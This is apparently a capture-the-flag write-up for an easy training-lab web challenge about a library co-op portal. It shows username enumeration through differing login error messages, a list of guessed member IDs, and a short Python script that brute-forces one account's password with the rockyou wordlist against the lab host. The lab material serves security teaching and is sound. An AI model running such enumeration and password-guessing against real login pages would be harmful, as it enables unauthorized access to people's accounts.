---

Name: Pinegrass Library Co-op
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/02/roll-call
Description: Pinegrass has been a member-funded library co-op since 1962. The online portal was set up by Cyrus, the volunteer IT person, who picked a "temporary" password for every staff member's account so they could each log in once and change it. None of them did. The login form, separately, was written by a copy editor who made the error messages clearer than is good for them. 

---

## Enumeration

The login page gives different error messages depending on whether the supplied member ID exists.

Trying the default credentials:

```text
admin:admin
```

returns:

```text
We don't have a member by that name.
```

This indicates that the application is vulnerable to **member ID enumeration**.

The `/about` page contains the names of the library's volunteers and staff. For example:

> Winifred Barrera

The login page also says that the member ID is printed on the library card and gives `jsmith` as an example. From this, I inferred that member IDs use the first letter of the first name followed by the surname.

The page footer also contains:

```text
Portal v0.4.2 · maintained by C. Sanders · please report bugs at the front desk
```

Following the same naming convention, I tried:

```text
csanders
```

This time the application responded:

```text
Password incorrect for member csanders.
```

This confirms that `csanders` is a valid member ID.

I repeated this process for the staff listed on `/about` and obtained:

```text
mcastan
rdavies
athao
jokafor
klindgren
btanaka
pgomes
smerritt
csanders
wbarrera
```

## Password attack

The challenge description states that Cyrus, the volunteer IT administrator, chose a **temporary password for every staff member**, and none of the staff changed it.

This suggests that the accounts use a weak/default password.

I used the confirmed valid account `csanders` and tested passwords from `rockyou.txt`. The application returns:

```text
Password incorrect for member csanders.
```

when the password is wrong, so I can detect a successful password when this message disappears.

```python
import requests as re

URL = "https://2fbe8f5a-5330-roll-call-944d6.challenges.webverselabs-pro.com/login"

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as wordlist:
    for line in wordlist:
        password = line.strip()

        content = {
            "member_id": "csanders",
            "password": password
        }

        response = re.post(URL, data=content)

        if "Password incorrect" not in response.text:
            print(f"Password found: {password}")
            break
```

The script found the password and after I logged in I got the flag
